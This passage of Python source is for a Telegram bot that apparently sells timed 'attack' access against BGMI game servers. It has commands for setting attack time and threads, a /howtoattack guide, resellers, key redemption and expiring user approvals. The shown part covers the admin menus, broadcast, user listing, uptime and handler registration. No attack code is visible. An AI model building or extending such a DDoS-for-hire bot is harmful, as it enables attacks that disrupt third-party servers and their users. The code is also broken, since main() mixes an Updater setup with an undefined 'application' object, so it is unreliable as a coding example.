            days, seconds = time_left.days, time_left.seconds
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60

            expiration_info = (
                f"⏳ *Access Expires On:* {ist_expiration.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"⌛ *Time Left:* {days} days, {hours} hours, {minutes} minutes"
            )
    else:
        expiration_info = "❌ *You have never been approved.*"

    # User information
    info_message = (
        "📝 *Your Information:*\n"
        f"🔗 *Username:* @{user.username if user.username else 'N/A'}\n"
        f"🆔 *User ID:* {user.id}\n"
        f"👤 *First Name:* {user.first_name}\n"
        f"👥 *Last Name:* {user.last_name if user.last_name else 'N/A'}\n\n"
        f"{expiration_info}\n"
    )
    
    await update.message.reply_text(info_message, parse_mode='Markdown',
    reply_markup=get_default_buttons())

async def admincommand(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await not_authorized_message(update)
        return

    admin_message = (
        "🔧 *Admin-only commands:*\n"
        "/approve - Add user\n"
        "/remove - Remove user\n"
        "/settime - Set Attack Time\n"
        "/setthread - Thread Changing\n"
        "/addbalance - Add Admin Balance\n"
        "/addadmin - Add Reseller\n"
        "💫 The owner of this bot is ❄️DAKU BHAIZ❄️. Contact @DAKUxBHAIZ."
    )
    await update.message.reply_text(admin_message, parse_mode='Markdown')
    
async def broadcast(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    if not context.args:
        await update.message.reply_text("❌ *Usage: /broadcast <message>*", parse_mode="Markdown")
        return

    message = " ".join(context.args)
    users = collection.find({"expiration_date": {"$gte": datetime.now()}})

    success_count = 0
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["user_id"], text=message, parse_mode="Markdown")
            success_count += 1
        except Exception as e:
            print(f"Failed to send message to {user['user_id']}: {e}")

    await update.message.reply_text(f"✅ *Broadcast sent to {success_count} users.*", parse_mode="Markdown")
    
async def users(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 *You are not authorized to use this command.*", parse_mode="Markdown")
        return

    users = collection.find({"expiration_date": {"$gte": datetime.now()}})
    user_list = "\n".join([f"🆔 {user['user_id']} - Expires: {user['expiration_date'].strftime('%Y-%m-%d %H:%M:%S')}" for user in users])

    if not user_list:
        user_list = "⚠️ *No active users found.*"

    await update.message.reply_text(f"📋 *Approved Users:*\n\n{user_list}", parse_mode="Markdown")
    
import time

# Bot start hone ka time track karne ke liye
start_time = time.time()

async def uptime(update: Update, context: CallbackContext):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)

    days = uptime_seconds // 86400
    hours = (uptime_seconds % 86400) // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60

    uptime_message = f"🕒 *Bot Uptime:*\n"
    if days > 0:
        uptime_message += f"📅 {days} days\n"
    uptime_message += f"⏳ {hours} hours, {minutes} minutes, {seconds} seconds"

    await update.message.reply_text(uptime_message, parse_mode="Markdown")

async def start_background_tasks(app):
    asyncio.create_task(notify_expiring_users(app.bot))  # Existing notification task
    asyncio.create_task(notify_unapproved_users(app.bot))  # Naya task unapproved users ke liye

def main():
    BOT_TOKEN = "your_bot_token_here"

    updater = Updater(BOT_TOKEN)  # `use_context=True` remove kar diya
    dp = updater.dispatcher

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("owner", owner))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("admincommand", admincommand))
    application.add_handler(CommandHandler("settime", set_attack_limit))
    application.add_handler(CommandHandler("setthread", set_thread))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("addbalance", addbalance))
    application.add_handler(CommandHandler("adminbalance", adminbalance))
    application.add_handler(CommandHandler("genkey", gen))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("removeadmin", removeadmin))
    application.add_handler(CommandHandler("removecoin", removecoin))
    application.add_handler(CommandHandler("howtoattack", howtoattack))
    application.add_handler(CommandHandler("canary", canary))
    application.add_handler(CommandHandler("clearattack", clear_attack))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("maintenance", maintenance_mode))
    application.add_handler(CallbackQueryHandler(join_channel, pattern="join_check"))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
